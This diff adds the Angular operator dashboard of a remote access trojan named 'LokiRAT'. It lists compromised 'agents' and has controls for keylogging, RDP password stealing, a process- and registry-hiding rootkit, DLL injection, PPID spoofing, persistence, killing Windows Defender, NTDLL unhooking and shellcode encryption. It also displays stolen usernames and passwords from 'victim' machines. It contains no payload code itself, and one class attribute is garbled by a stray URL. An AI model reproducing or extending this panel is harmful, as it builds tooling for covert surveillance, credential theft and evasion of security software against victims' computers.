@@ -1,0 +1,537 @@
+<router-outlet></router-outlet>
+<div class="message-container" id="messageContainer" *ngIf="message !== ''"
+    [ngStyle]="{'border': isError ? '2px solid red' : '2px solid green'}">
+    <p class="message" *ngIf="message !== ''">{{ message }}</p>
+</div>
+<div class="bodyMadafak">
+    <div class="header border">
+        <div class="header-content d-flex justify-content-between ml-2 mr-2 mt-2 mb-2">
+            <b class="text-white">LokiRAT</b>
+            <a class="text-white" href="/configuration">Configuration</a>
+        </div>
+    </div>
+
+
+    <div class="d-flex justify-content-between addButton">
+        <div class="" style="margin-left: 60px;">
+            <button class="btn btn-primary" (click)="encryptButtonClick()">Encrypt Shellcode</button>
+        </div>
+        <!-- <input type="text" class="form-control sizePerra" [(ngModel)]="SEVER_URL" placeholder="Server URL"> -->
+        <p class="btn btn-primary" (click)="addAgent()">Create Agent EXE</p>
+    </div>
+    <div class="d-flex justify-content-center align-items-center">
+        <div class="d-flex mainTable2 justify-content-center align-items-center flex-column shadow">
+            <table class="table mainTable">
+                <thead>
+                    <tr>
+                        <th scope="col" class="text-center">ID</th>
+                        <th scope="col" class="text-center">Username</th>
+                        <th scope="col" class="text-center">IP</th>
+                        <th scope="col" class="text-center">Online</th>
+                        <th scope="col" class="text-center">Manage</th>
+                        <th scope="col" class="text-center">File Explorer</th>
+                        <th scope="col" class="text-center">EXE As Admin</th>
+                        <th scope="col" class="text-center">List Processes</th>
+                        <th scope="col" class="text-center">DLL Injection</th>
+                        <th scope="col" class="text-center">User Rootkit</th>
+                        <th scope="col" class="text-center">Command</th>
+                        <th scope="col" class="text-center">Scheduled Task</th>
+                        <th scope="col" class="text-center">Keylogger</th>
+                        <th scope="col" class="text-center">RDP Stealer</th>
+                        <th scope="col" class="text-center">Security Detector</th>
+                        <th scope="col" class="text-center">Persistence</th>
+                        <th scope="col" class="text-center">PPID Spoofing</th>
+                        <th scope="col" class="text-center">EXE as Service</th>
+                        <th scope="col" class="text-center">Windows Defender Killer</th>
+                        <th scope="col" class="text-center">Unhook NTDLL</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr *ngFor="let agent of agents | paginate: { itemsPerPage: pageSize, currentPage: currentPageR }">
+                        <th scope="row" class="text-center">{{ agent.id }}</th>
+                        <td class="text-center">{{ agent.user }}</td>
+                        <td class="text-center">{{ agent.ip }}</td>
+                        <td class="text-center">
+                            <img *ngIf="agent.online == 0" src="assets/img/cross.png" alt="offline" width="25"
+                                height="25" (click)="onlineClick(agent.online, agent.id)">
+                            <img *ngIf="agent.online == 1" src="assets/img/tick.jpg" alt="online" width="25" height="25"
+                                (click)="onlineClick(agent.online, agent.id)">
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-danger marginButtons ml-2" (click)="deleteAgent(agent.id)">Delete</a>
+                                <a class="btn btn-warning marginButtons text-white ml-2"
+                                    (click)="unistall(agent.id)">Uninstall</a>
+                                <a class="btn btn-info marginButtons text-white ml-2"
+                                    (click)="systemEnumeration(agent.id)">Info</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)='fileExplorer(agent.id)'>Run</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)='executeAsAdminActive(agent.id)'>Run</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" href="/processes/{{ agent.id }}">List</a>
+                                <!-- This line was modified from the original code -->
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="dllInjection(agent.id)">Inject</a>
+                                <!-- This line was modified from the original code -->
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="initRootkitClick(agent.id)">Rootkit</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="commandExecution(agent.id)">Execute</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="freeInjection(agent.id)">Task</a>
+                            </div>
+                        </td>
+                        <td class="texhttps://tallpurpledog69.conveyor.clout-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="keylogger(agent.id)">Log</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="rdpStealer(agent.id)">Stealer</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="securityDetector(agent.id)">Detect</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="persistence(agent.id)">Run</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="ppidSpoofing(agent.id)">Spoof</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="executeAsService(agent.id)">Service</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="winDefender(agent.id)">Kill</a>
+                            </div>
+                        </td>
+                        <td class="text-center">
+                            <div class="d-flex justify-content-center align-items-center">
+                                <a class="btn btn-primary mr-1" (click)="unhookNTDLL(agent.id)">Unhook</a>
+                            </div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+            <div class="d-flex justify-content-center mt-3">
+                <pagination-controls (pageChange)="currentPageR = $event"></pagination-controls>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="popup" *ngIf="isAddAgent">
+    <div class="popup-content">
+        <div class="custom-header">
+            <b>Enter the url of the server to reach from the agent computer</b>
+        </div>
+        <div class="custom-content">
+            <input type="text" class="form-control" [(ngModel)]="url" placeholder="Enter the url">
+        </div>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closePopup()">Cancel</button>
+            <button class="btn btn-primary" (click)="createAgent()">Create</button>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="winDef">
+    <div class="popup-content">
+        <div class="custom-header d-flex align-items-center justify-content-center">
+            <b class="text-center">Windows Defender Killer</b>
+        </div>
+        <p class="text-center">Are you sure you want to kill the Windows Defender Permanently?</p>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeWinDefPopup()">Cancel</button>
+            <button class="btn btn-primary" (click)="winDefenderFinal()">Create</button>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="rootkitInit">
+    <div *ngIf="!isNowInstalled" class="popup-content">
+        <div class="custom-header">
+            <b>Are you sure you want to init the Userland Rootkit?</b>
+        </div>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closePopupRootkit()">Cancel</button>
+            <button class="btn btn-primary" (click)="initRootkit()">Init</button>
+        </div>
+    </div>
+    <div *ngIf="isNowInstalled" class="popup-content">
+        <div class="custom-header">
+            <b class="text-success">Userland Rootkit is now installed</b>
+        </div>
+        <label class="mt-2">Hide Process</label>
+        <input type="text" class="form-control" [(ngModel)]="processToHide" placeholder="Enter the process name">
+
+
+        <label class="mt-2">Hide Directory</label>
+        <input type="text" class="form-control" [(ngModel)]="fileToHide" placeholder="Enter the directory path">
+
+
+        <label class="mt-2">Hide Registry</label>
+        <input type="text" class="form-control" [(ngModel)]="registryToHide" placeholder="Enter the registry path">
+
+
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger mr-1" style="margin-right: 5px;" (click)="cancelRootkit()">Cancel</button>
+            <button class="btn btn-primary ml-1" (click)="hider()">Hide</button>
+        </div>
+
+        <div *ngIf="!isNowInstalled" class="d-flex justify-content-center mt-3">
+            <button class="btn btn-primary" (click)="closePopupRootkit()">Close</button>
+        </div>
+
+
+        <div class="popup" *ngIf="isFileExplorer">
+            <div class="popup-content">
+                <div class="custom-header">
+                    <b>Enter the first path to see from the agent computer</b>
+                </div>
+                <div class="custom-content">
+                    <input type="text" class="form-control" [(ngModel)]="path" placeholder="Enter the path">
+                </div>
+                <div class="d-flex justify-content-center mt-3">
+                    <button class="btn btn-danger" style="margin-right: 5px;" (click)="closePopup()">Cancel</button>
+                    <button class="btn btn-primary" (click)="explorerConfirm()">Create</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="isDLLInjection">
+    <div class="popup-content">
+        <div class="custom-header">
+            <b>Enter the process name to inject the DLL</b>
+        </div>
+        <div class="custom-content mt-2">
+            <input type="text" class="form-control" [(ngModel)]="processName" placeholder="Enter the process name">
+            <input type="text" class="form-control mt-2" [(ngModel)]="dllPath" placeholder="Enter the DLL path">
+        </div>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closePopupDLL()">Cancel</button>
+            <button class="btn btn-primary" (click)="dllInjectionConfirm()">Inject</button>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="executeAsAdmin">
+    <div class="popup-content">
+        <div class="custom-header">
+            <b>Enter the path or process name to execute as administrator</b>
+        </div>
+        <div class="custom-content">
+            <input type="text" class="form-control" [(ngModel)]="pathExecute"
+                placeholder="Enter the process or EXE path to Execute">
+        </div>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeExecutePopup()">Cancel</button>
+            <button class="btn btn-primary" (click)="confirmExecuteAsAdmin()">Execute</button>
+        </div>
+    </div>
+</div>
+
+
+<div class="popup" *ngIf="enc">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">Shellcode Encryption</b>
+        </div>
+        <div class="custom-content mt-2 text-center">
+            <select class="form-select" [(ngModel)]="encryptionType">
+                <option value="0">XOR</option>
+                <!-- <option value="1">AES</option> -->
+            </select>
+        </div>
+        <div class="d-flex justify-content-center mt-3 flex-wrap">
+            <input type="text" class="form-control full-width" [(ngModel)]="shellcodePass"
+                placeholder="Enter the password">
+            <input type="text" class="form-control normal-height" [(ngModel)]="shellcode"
+                placeholder="Enter the shellcode">
+        </div>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeEnc()">Cancel</button>
+            <button class="btn btn-primary" (click)="encryptShellcode()">Encrypt</button>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="iscommandExecution">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">Command Execution</b>
+            <p>[!] The command will be exeucted as Administrator</p>
+        </div>
+        <div class="d-flex justify-content-center mt-3 flex-wrap">
+            <input type="text" class="form-control full-width" [(ngModel)]="commandToExecute"
+                placeholder="Enter the command">
+        </div>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeCom()">Cancel</button>
+            <button class="btn btn-primary" (click)="executeCommand()">Execute</button>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="taskSch">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">Create Scheduled Task</b>
+        </div>
+        <div class="d-flex justify-content-center mt-3 flex-wrap">
+            <input type="text" class="form-control" [(ngModel)]="taskName" placeholder="Enter the task name">
+            <input type="text" class="form-control mt-2" [(ngModel)]="commandTask"
+                placeholder="Enter the command to execute">
+            <input type="text" class="form-control mt-2" [(ngModel)]="parametersTask"
+                placeholder="Enter the task arguments">
+            <input type="text" class="form-control mt-2" [(ngModel)]="intervalTask"
+                placeholder="Enter the interval time to execute the task (m)">
+        </div>
+        <div class="d-flex justify-content-center mt-3">
+            <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeFree()">Cancel</button>
+            <button class="btn btn-primary" (click)="createTask()">Create</button>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="popup" *ngIf="isKeylogger">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">Keylogger</b>
+        </div>
+        <div class="mt-2" *ngIf="!isNowInstalled && !haveKeyloggerResults">
+            <p class="text-center">You want to check the keylogger status in the victim OS?</p>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeKeylogger()">Cancel</button>
+                <button class="btn btn-primary" (click)="finalKeylogger()">Check</button>
+            </div>
+        </div>
+        <div class="mt-2" *ngIf="isNowInstalled && !haveKeyloggerResults">
+            <p>The keylogger it's installed in the victim OS, you need to wait for results!</p>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="" (click)="closeKeylogger()">Cancel</button>
+            </div>
+        </div>
+        <div class="mt-2" *ngIf="haveKeyloggerResults">
+            <p>We have the following results from the victim keylogger:</p>
+            <div *ngFor="let result of keyloggerResult; let i = index" class="text-center">
+                <p class="text-center wrap-text"> <b>{{ i }}: </b>{{ result }}</p>
+            </div>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeKeylogger()">Cancel</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="rdpStealerP">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">RDP Stealer</b>
+        </div>
+        <div class="mt-2" *ngIf="!installRDPedNow && !haveRDPResults">
+            <p class="text-center">You want to check the RDP Stealer status in the victim OS?</p>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeRDP()">Cancel</button>
+                <button class="btn btn-primary" (click)="finalRDP()">Check</button>
+            </div>
+        </div>
+        <div class="mt-2" *ngIf="installRDPedNow && !haveRDPResults">
+            <p>The RDP Stealer it's now installed in the victim OS, you need to wait for results!</p>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="" (click)="closeRDP()">Cancel</button>
+            </div>
+        </div>
+        <div class="mt-2" *ngIf="haveRDPResults">
+            <p>We have the following 10 newest results from the victim RDP Stealer:</p>
+            <table class="table">
+                <thead class="thead-dark">
+                    <tr>
+                        <th class="text-center">Username</th>
+                        <th class="text-center">Password</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr *ngFor="let result of rdpResult; let i = index">
+                        <td class="text-center">{{ result.split(':')[0] }}</td>
+                        <td class="text-center">{{ result.split(':')[1] }}</td>
+                    </tr>
+                </tbody>
+            </table>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeRDP()">Cancel</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="defensesPopup">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">Security Detector</b>
+        </div>
+        <div class="mt-2" *ngIf="!isNowInstalledSec && !haveSecurityResults">
+            <p class="text-center">You want to check the security detector status in the victim OS?</p>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeSecurity()">Cancel</button>
+                <button class="btn btn-primary" (click)="finalSecurity()">Check</button>
+            </div>
+        </div>
+        <div class="mt-2" *ngIf="isNowInstalledSec && !haveSecurityResults">
+            <p>The security detector it's installed in the victim OS, you need to wait for results!</p>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="" (click)="closeSecurity()">Cancel</button>
+            </div>
+        </div>
+        <div class="mt-2" *ngIf="haveSecurityResults">
+            <p>We have the following results from the victim security detector:</p>
+            <div *ngFor="let result of securityResult; let i = index" class="text-center">
+                <div class="result-line">
+                    <p *ngIf="i === 0" class="result-text"> <b>{{ i }}: </b>{{ result.split(" ")[0] + " " +
+                        result.split(" ")[1] }}</p>
+                    <p *ngIf="i !== 0" class="result-text"> <b>{{ i }}: </b>{{ result.split(" ")[0] }}</p>
+                    <img *ngIf="result.includes('Unknown')" src="assets/img/cross.png" alt="offline" width="25"
+                        height="25">
+                    <img *ngIf="!result.includes('Unknown')" src="assets/img/tick.jpg" alt="online" width="25"
+                        height="25">
+                </div>
+            </div>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeSecurity()">Cancel</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="persistencePopup">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">Persistence</b>
+        </div>
+        <div class="mt-2">
+            <p class="text-center">Create Persistence for a EXE</p>
+            <div class="d-flex justify-content-center align-items-center flex-wrap mt-3">
+                <label for="persistencePath">EXE Path</label>
+                <input type="text" class="form-control" [(ngModel)]="persistencePath" placeholder="Enter the EXE path">
+                <label for="persistenceName">Persistence Name</label>
+                <input type="text" class="form-control" [(ngModel)]="persistenceName"
+                    placeholder="Enter the persistence name">
+            </div>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closePersistence()">Cancel</button>
+                <button class="btn btn-primary" (click)="createPersistence()">Create</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="ppidSpoofingPopup">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">PPID Spoofing</b>
+        </div>
+        <div class="mt-2">
+            <p class="text-center">Create PPID Spoofing for a EXE</p>
+            <div class="d-flex justify-content-center align-items-center flex-wrap mt-3">
+                <label for="ppidPath">EXE Path</label>
+                <input type="text" class="form-control" [(ngModel)]="ppidPath" placeholder="Enter the EXE path">
+                <label for="ppidName">Parent Process Name</label>
+                <input type="text" class="form-control" [(ngModel)]="ppidName"
+                    placeholder="Enter the Parent Process name">
+            </div>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closePPID()">Cancel</button>
+                <button class="btn btn-primary" (click)="createPPID()">Create</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="exeAsService">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">EXE as Service</b>
+        </div>
+        <div class="mt-2">
+            <p class="text-center">Create a EXE as a Service</p>
+            <div class="d-flex justify-content-center align-items-center flex-wrap mt-3">
+                <label for="servicePath">EXE Path</label>
+                <input type="text" class="form-control" [(ngModel)]="servicePath" placeholder="Enter the EXE path">
+                <label for="serviceName">Service Name</label>
+                <input type="text" class="form-control" [(ngModel)]="serviceName" placeholder="Enter the Service name">
+            </div>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeService()">Cancel</button>
+                <button class="btn btn-primary" (click)="createService()">Create</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="popup" *ngIf="unhookPopup">
+    <div class="popup-content">
+        <div class="custom-header text-center">
+            <b class="fntsize">Unhook NTDLL</b>
+        </div>
+        <div class="mt-2">
+            <p class="text-center">Unhook the NTDLL from a remote process</p>
+            <div class="d-flex justify-content-center align-items-center flex-wrap mt-3">
+                <label for="unhookPath">Process Name</label>
+                <input type="text" class="form-control" [(ngModel)]="unhookProcess"
+                    placeholder="Enter the process name">
+            </div>
+            <div class="d-flex justify-content-center mt-3">
+                <button class="btn btn-danger" style="margin-right: 5px;" (click)="closeUnhook()">Cancel</button>
+                <button class="btn btn-primary" (click)="unhook()">Unhook</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="overlay" *ngIf="loading">
+    <!-- Loading spinner -->
+    <div class="spinner-container" *ngIf="loading">
+        <div class="spinner-border" role="status">
+            <span class="sr-only">Loading...</span>
+        </div>
+    </div>
+</div>
